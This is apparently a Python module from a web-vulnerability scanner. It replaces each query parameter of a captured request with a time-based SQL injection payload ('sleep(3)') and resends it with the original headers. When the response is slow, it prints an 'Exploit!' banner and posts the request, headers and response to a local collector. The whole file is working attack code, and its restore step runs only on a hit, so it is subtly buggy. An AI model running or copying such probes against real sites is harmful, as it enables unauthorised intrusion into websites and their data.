from time import time
from json import dumps

from requests import get, post, exceptions

from urllib.parse import urlparse, parse_qs


class FakeRequest(object):
    content = ''
    status_code = 0


def go(web_request):
    """Doing Attack
    :param web_request:

    requestId
    ----------------------
    method
    url
    requestBody
    requestHeaders
    type
    ----------------------

    status_code
    responseHeaders

    :return: None
    """
    o = urlparse(web_request['url'])
    attack_query = parse_qs(o.query)
    url = o._replace(query=None).geturl()
    for k, v in attack_query.items():
        tmp_value = v
        attack_query[k] = 'sleep(3)'
        a1 = time()
        print(attack_query)
        try:
            tmp_header = {}
            for w in web_request['requestHeaders']:
                tmp_header[w['name']] = w['value']

            r = get(url, params=attack_query, timeout=5, headers=tmp_header)
        except exceptions.Timeout:
            r = FakeRequest()
        a2 = time()
        if a2 - a1 >= 3:
            ss = """\033[36m

              _____            _       _ _     _
             | ____|_  ___ __ | | ___ (_) |_  | |
             |  _| \ \/ / '_ \| |/ _ \| | __| | |
             | |___ >  <| |_) | | (_) | | |_  |_|
             |_____/_/\_\ .__/|_|\___/|_|\__| (_)
                        |_|

            \033[37m"""

            print(ss)

            print(a2 - a1)
            urlz = 'http://localhost:8787/success'
            data = {
                'request_id': web_request['requestId'],
                'module_id': 17384,
                'url': url,
                'r_method': web_request['method'],
                'r_type': web_request['type'],
                'attack_query': dumps(attack_query),
                'body': dumps(attack_query),
                'request_headers': dumps(tmp_header),
                'response_headers': dumps(web_request['responseHeaders']),
                'response_body': r.content,
                'response_status': r.status_code,
            }
            post(urlz, data=data)

            attack_query[k] = tmp_value
